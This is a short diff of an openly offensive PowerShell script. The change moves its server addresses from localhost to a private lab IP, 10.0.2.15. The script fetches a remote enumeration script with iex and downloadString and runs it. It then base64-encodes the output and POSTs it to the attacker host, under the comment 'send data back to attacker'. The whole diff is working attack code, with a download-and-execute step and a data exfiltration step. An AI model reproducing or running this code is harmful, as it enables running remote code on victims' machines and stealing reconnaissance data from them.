@@ -18,10 +18,10 @@
 
     #>
 
-$enum = iex (New-Object Net.WebClient).downloadString('http://127.0.0.1:8080/enumScript.ps1')
+$enum = iex (New-Object Net.WebClient).downloadString('http://10.0.2.15:8080/enumScript.ps1')
 $encoderesults = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($enum))
 
 #send data back to attacker
 $postParams = @{username=$encoderesults;}
 $postParams
-Invoke-WebRequest -Uri http://127.0.0.1:8080/ -Method POST -Body $postParams
+Invoke-WebRequest -Uri http://10.0.2.15:443/ -Method POST -Body $postParams
